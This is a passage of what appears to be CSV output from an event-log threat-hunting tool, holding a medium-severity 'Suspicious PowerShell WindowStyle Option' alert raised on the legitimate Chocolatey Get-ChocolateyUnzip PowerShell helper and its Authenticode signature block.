z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgM4dhQyywPrPo8jpeR3DNbT7H2WdznBS1+Bus # KT2bfQ0wDQYJKoZIhvcNAQEBBQAEggEAbWUKxJRm84/EF8/zeqa1zKe4AWpJ/gEi # QwtcOXs0Qnyft51e8c1xU2GOQZgAGvgSh7/PxsyVsFf5RMUF4KTVDTiF1PBanepr # vyJHjlmCWoa+NIncrLkelzSZLVmR91IGBpxxuL3E03d1rLOBK3MsTsv/n1l0nTzj # Th0bWNHNjcnJ89/jqS6j0E/x06GXwECdXPke/u6rpZ+ne5huAOlJgmce9bBL1v39 # SLEstdUW37fHTfvf8W4O3vdUYwXayuZOv+5ACQA5wVnwEL/jv+qxNFlM1ciPSuDH # DnFvlJp1vUavbyg9F+n4RYni9EUQTAw9F7Izk3Mt3mS6HCFwSwVWtaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQUAIvU+JA/yY/VMDda # AF5AyoutdvkwDQYJKoZIhvcNAQEBBQAEggEAAw12+/6F/pa2s2bjPlFgk4ZjQcRt # p/abG6OoDWEMorncdvyhrOe39oQxthDUOLm/FW8JvvlFNHxBwjCy4KUxPRTsmmBf # JKzuGv9Au1dfjGJAS+lPZyxTC5nyeKbCnG3Zwy77dAxvN2ZVd/vRhyw/itKoE3Lv # MSvUKhrRTFB1Sm7if/dh9r5YiBFCgKoTJJ9PCxIrGOx6R3Gbci+StDJXHBDOqgDh # HNoYd6Z6V6AKPy3mzU3yitDuMA2ugksV6OHroWUCUGfVkUCPHJZMceJVXzYTbCUS # wgDjjauYaSo+kzjicD27CjwNSeHZP0MSLFSoHfoU76lF2iplygQ1pdmkMw== # SIG # End signature block","d2c72fb1-8ebf-d5d3-1e88-80f15ba1079a"
"2019-03-19 14:21:36.477 +01:00","Suspicious PowerShell WindowStyle Option","med","MSEDGEWIN10","PwSh",4104,70,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-ChocolateyUnzip { <# .SYNOPSIS Unzips an archive file and returns the location for further processing. .DESCRIPTION This unzips files using the 7-zip command line tool 7z.exe. Supported archive formats are listed at: https://sevenzip.osdn.jp/chm/general/formats.htm Prior to 0.9.10.1, 7za.exe was used. Supported archive formats for 7za.exe are: 7z, lzma, cab, zip, gzip, bzip2, and tar. .INPUTS None .OUTPUTS Returns the passed in $destination. .NOTES If extraction fails, an exception is thrown. If you are embedding files into a package, ensure that you have the rights to redistribute those files if you are sharing this package publicly (like on the community feed). Otherwise, please use Install-ChocolateyZipPackage to download those resources from their official distribution points. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code based on 7-zip's exit code. .PARAMETER FileFullPath This is the full path to the zip file. If embedding it in the package next to the install script, the path will be like `""$(Split-Path -Parent $MyInvocation.MyCommand.Definition)\\file.zip""` In 0.10.1+, `File` is an alias for FileFullPath. This can be a 32-bit or 64-bit file. This is mandatory in earlier versions of Chocolatey, but optional if FileFullPath64 has been provided. .PARAMETER FileFullPath64 Full file path to a 64-bit native installer to run. Available in 0.10.4+. If embedding in the package, you can get it to the path with `""$(Split-Path -parent $MyInvocation.MyCommand.Definition)\\INSTALLER_FILE""` Provide this when you want to provide both 32-bit and 64-bit installers or explicitly only a 64-bit installer (which will cause a package install failure on 32-bit systems). .PARAMETER Destination This is a directory where you would like the unzipped files to end up. If it does not exist, it will be created. .PARAMETER SpecificFolder OPTIONAL - This is a specific directory within zip file to extract. .PARAMETER PackageName OPTIONAL - This will faciliate logging unzip activity for subsequent uninstalls .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Path to the folder where the script is executing $toolsDir = (Split-Path -parent $MyInvocation.MyCommand.Definition) Get-ChocolateyUnzip -FileFullPath ""c:\someFile.zip"" -Destination $toolsDir .LINK Install-ChocolateyZipPackage #> param( [alias(""file"")][parameter(Mandatory=$false, Position=0)][string] $fileFullPath, [parameter(Mandatory=$true, Position=1)][string] $destination, [parameter(Mandatory=$false, Position=2)][string] $specificFolder, [parameter(Mandatory=$false, Position=3)][string] $packageName, [alias(""file64"")][parameter(Mandatory=$false)][string] $fileFullPath64, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bitnessMessage = '' $zipfileFullPath=$fileFullPath if ((Get-ProcessorBits 32) -or $env:ChocolateyForceX86 -eq 'true') { if (!$fileFullPath) { throw ""32-bit archive is not supported for $packageName""; } if ($fileFullPath64) { $bitnessMessage = '32-bit '; } } elseif ($fileFullPath64) { $zipfileFullPath = $fileFullPath64 $bitnessMessage = '64-bit ' } if ($zipfileFullPath -eq '' -or $zipfileFullPath -eq $null) { throw 'Package parameters incorrect, either FileFullPath or FileFullPath64 must be specified.' } if ($packageName) { $packagelibPath = $env:ChocolateyPackageFolder if (!(Test-Path -path $packagelibPath)) { New-Item $packagelibPath -type directory } $zipFilename=split-path $zipfileFullPath -Leaf $zipExtractLogFullPath= Join-Path $packagelibPath $zipFilename`.txt } if ($env:chocolateyPackageName -ne $null -and $env:chocolateyPackageName -eq $env:ChocolateyInstallDirectoryPackage) { Write-Warning ""Install Directory override not available for zip packages at this time.`n If this package also runs a native installer using Chocolatey`n functions, the directory will be honored."" } Write-Host ""Extracting $bitnessMessage$zipfileFullPath to $destination..."" if (![System.IO.Directory]::Exists($destination)) { [System.IO.Directory]::CreateDirectory($destination) | Out-Null } $7zip = Join-Path ""$helpersPath"" '..\tools\7z.exe' if (!([System.IO.File]::Exists($7zip))) { Update-SessionEnvironment $7zip = Join-Path ""$env:ChocolateyInstall"" 'tools\7z.exe' } $7zip = [System.IO.Path]::GetFullPath($7zip) Write-Debug ""7zip found at `'$7zip`'"" # 32-bit 7z would not find C:\Windows\System32\config\systemprofile\AppData\Local\Temp, # because it gets translated to C:\Windows\SysWOW64\... by the WOW redirection layer. # Replace System32 with sysnative, which does not get redirected. # 32-bit 7z is required so it can see both architectures if ([IntPtr]::Size -ne 4) { $fileFullPathNoRedirection = $zipfileFullPath -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') $destinationNoRedirection = $destination -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') } else { $fileFullPathNoRedirection = $zipfileFullPath $destinationNoRedirection = $destination } $params = ""x -aoa -bd -bb1 -o`""$destinationNoRedirection`"" -y `""$fileFullPathNoRedirection`"""" if ($specificfolder) { $params += "" `""$specificfolder`"""" } Write-Debug ""Executing command ['$7zip' $params]"" # Capture 7z's output into a StringBuilder and write it out in blocks, to improve I/O performance. $global:zipFileList = New-Object System.Text.StringBuilder $global:zipDestinationFolder = $destination # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { $line = $EventArgs.Data Write-Verbose ""$line"" if ($line.StartsWith(""- "")) { $global:zipFileList.AppendLine($global:zipDestinationFolder + ""\"" + $line.Substring(2)) } } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyZipProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyZipProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null $process.StartInfo = new-object System.Diagnostics.ProcessStartInfo($7zip, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = Get-Location $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.StartInfo.CreateNoWindow = $true $process.Start() | Out-Null if ($process.StartInfo.RedirectStandardOutput) { $process.BeginOutputReadLine() } if ($process.StartInfo.RedirectStandardError) { $process.BeginErrorReadLine() } $process.WaitForExit() # For some reason this forces the jobs to finish and waits for # them to do so. Without this it never finishes. Unregister-Event -SourceIdentifier ""LogOutput_ChocolateyZipProc"" Unregister-Event -SourceIdentifier ""LogErrors_ChocolateyZipProc"" # sometimes the process hasn't fully exited yet. for ($loopCount=1; $loopCount -le 15; $loopCount++) { if ($process.HasExited) { break; } Write-Debug ""Waiting for 7z.exe process to exit - $loopCount/15 seconds""; Start-Sleep 1; } $exitCode = $process.ExitCode $process.Dispose() Set-PowerShellExitCode $exitCode Write-Debug ""Command ['$7zip' $params] exited with `'$exitCode`'."" if ($zipExtractLogFullPath) { Set-Content $zipExtractLogFullPath $global:zipFileList.ToString() -Encoding UTF8 -Force } Write-Debug ""7z exit code: $exitCode"" $errorMessageAddendum = "" This is most likely an issue with the '$env:chocolateyPackageName' package and not with Chocolatey itself. Please follow up with the package maintainer(s) directly."" switch ($exitCode) { 0 { break } 1 { throw 'Some files could not be extracted.' + $errorMessageAddendum } # this one is returned e.g. for access denied errors 2 { throw '7-Zip encountered a fatal error while extracting the files.' + $errorMessageAddendum } 7 { throw ('7-Zip command line error.' + $errorMessageAddendum) } 8 { throw '7-Zip out of memory.' + $errorMessageAddendum } 255 { throw 'Extraction cancelled by the user.' + $errorMessageAddendum } default { throw ""7-Zip signalled an unknown error (code $exitCode)"" + $errorMessageAddendum} } $env:ChocolateyPackageInstallLocation = $destination return $destination } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCDl7UF34Z4O7bJl # J2k4Fq6w3RZugnxsmdjzMLvixJbal6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lD","MessageNumber: 1 ¦ MessageTotal: 2 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Get-ChocolateyUnzip.ps1 ¦ ScriptBlockId: 1419c8c9-958e-44c3-9d03-ff48afcea7cc ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-ChocolateyUnzip { <# .SYNOPSIS Unzips an archive file and returns the location for further processing. .DESCRIPTION This unzips files using the 7-zip command line tool 7z.exe. Supported archive formats are listed at: https://sevenzip.osdn.jp/chm/general/formats.htm Prior to 0.9.10.1, 7za.exe was used. Supported archive formats for 7za.exe are: 7z, lzma, cab, zip, gzip, bzip2, and tar. .INPUTS None .OUTPUTS Returns the passed in $destination. .NOTES If extraction fails, an exception is thrown. If you are embedding files into a package, ensure that you have the rights to redistribute those files if you are sharing this package publicly (like on the community feed). Otherwise, please use Install-ChocolateyZipPackage to download those resources from their official distribution points. Starting in 0.9.10, will automatically call Set-PowerShellExitCode to set the package exit code based on 7-zip's exit code. .PARAMETER FileFullPath This is the full path to the zip file. If embedding it in the package next to the install script, the path will be like `""$(Split-Path -Parent $MyInvocation.MyCommand.Definition)\\file.zip""` In 0.10.1+, `File` is an alias for FileFullPath. This can be a 32-bit or 64-bit file. This is mandatory in earlier versions of Chocolatey, but optional if FileFullPath64 has been provided. .PARAMETER FileFullPath64 Full file path to a 64-bit native installer to run. Available in 0.10.4+. If embedding in the package, you can get it to the path with `""$(Split-Path -parent $MyInvocation.MyCommand.Definition)\\INSTALLER_FILE""` Provide this when you want to provide both 32-bit and 64-bit installers or explicitly only a 64-bit installer (which will cause a package install failure on 32-bit systems). .PARAMETER Destination This is a directory where you would like the unzipped files to end up. If it does not exist, it will be created. .PARAMETER SpecificFolder OPTIONAL - This is a specific directory within zip file to extract. .PARAMETER PackageName OPTIONAL - This will faciliate logging unzip activity for subsequent uninstalls .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # Path to the folder where the script is executing $toolsDir = (Split-Path -parent $MyInvocation.MyCommand.Definition) Get-ChocolateyUnzip -FileFullPath ""c:\someFile.zip"" -Destination $toolsDir .LINK Install-ChocolateyZipPackage #> param( [alias(""file"")][parameter(Mandatory=$false, Position=0)][string] $fileFullPath, [parameter(Mandatory=$true, Position=1)][string] $destination, [parameter(Mandatory=$false, Position=2)][string] $specificFolder, [parameter(Mandatory=$false, Position=3)][string] $packageName, [alias(""file64"")][parameter(Mandatory=$false)][string] $fileFullPath64, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bitnessMessage = '' $zipfileFullPath=$fileFullPath if ((Get-ProcessorBits 32) -or $env:ChocolateyForceX86 -eq 'true') { if (!$fileFullPath) { throw ""32-bit archive is not supported for $packageName""; } if ($fileFullPath64) { $bitnessMessage = '32-bit '; } } elseif ($fileFullPath64) { $zipfileFullPath = $fileFullPath64 $bitnessMessage = '64-bit ' } if ($zipfileFullPath -eq '' -or $zipfileFullPath -eq $null) { throw 'Package parameters incorrect, either FileFullPath or FileFullPath64 must be specified.' } if ($packageName) { $packagelibPath = $env:ChocolateyPackageFolder if (!(Test-Path -path $packagelibPath)) { New-Item $packagelibPath -type directory } $zipFilename=split-path $zipfileFullPath -Leaf $zipExtractLogFullPath= Join-Path $packagelibPath $zipFilename`.txt } if ($env:chocolateyPackageName -ne $null -and $env:chocolateyPackageName -eq $env:ChocolateyInstallDirectoryPackage) { Write-Warning ""Install Directory override not available for zip packages at this time.`n If this package also runs a native installer using Chocolatey`n functions, the directory will be honored."" } Write-Host ""Extracting $bitnessMessage$zipfileFullPath to $destination..."" if (![System.IO.Directory]::Exists($destination)) { [System.IO.Directory]::CreateDirectory($destination) | Out-Null } $7zip = Join-Path ""$helpersPath"" '..\tools\7z.exe' if (!([System.IO.File]::Exists($7zip))) { Update-SessionEnvironment $7zip = Join-Path ""$env:ChocolateyInstall"" 'tools\7z.exe' } $7zip = [System.IO.Path]::GetFullPath($7zip) Write-Debug ""7zip found at `'$7zip`'"" # 32-bit 7z would not find C:\Windows\System32\config\systemprofile\AppData\Local\Temp, # because it gets translated to C:\Windows\SysWOW64\... by the WOW redirection layer. # Replace System32 with sysnative, which does not get redirected. # 32-bit 7z is required so it can see both architectures if ([IntPtr]::Size -ne 4) { $fileFullPathNoRedirection = $zipfileFullPath -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') $destinationNoRedirection = $destination -ireplace ([System.Text.RegularExpressions.Regex]::Escape([Environment]::GetFolderPath('System'))),(Join-Path $Env:SystemRoot 'SysNative') } else { $fileFullPathNoRedirection = $zipfileFullPath $destinationNoRedirection = $destination } $params = ""x -aoa -bd -bb1 -o`""$destinationNoRedirection`"" -y `""$fileFullPathNoRedirection`"""" if ($specificfolder) { $params += "" `""$specificfolder`"""" } Write-Debug ""Executing command ['$7zip' $params]"" # Capture 7z's output into a StringBuilder and write it out in blocks, to improve I/O performance. $global:zipFileList = New-Object System.Text.StringBuilder $global:zipDestinationFolder = $destination # Redirecting output slows things down a bit. $writeOutput = { if ($EventArgs.Data -ne $null) { $line = $EventArgs.Data Write-Verbose ""$line"" if ($line.StartsWith(""- "")) { $global:zipFileList.AppendLine($global:zipDestinationFolder + ""\"" + $line.Substring(2)) } } } $writeError = { if ($EventArgs.Data -ne $null) { Write-Error ""$($EventArgs.Data)"" } } $process = New-Object System.Diagnostics.Process $process.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogOutput_ChocolateyZipProc"" -EventName OutputDataReceived -Action $writeOutput | Out-Null Register-ObjectEvent -InputObject $process -SourceIdentifier ""LogErrors_ChocolateyZipProc"" -EventName ErrorDataReceived -Action $writeError | Out-Null $process.StartInfo = new-object System.Diagnostics.ProcessStartInfo($7zip, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.RedirectStandardError = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WorkingDirectory = Get-Location 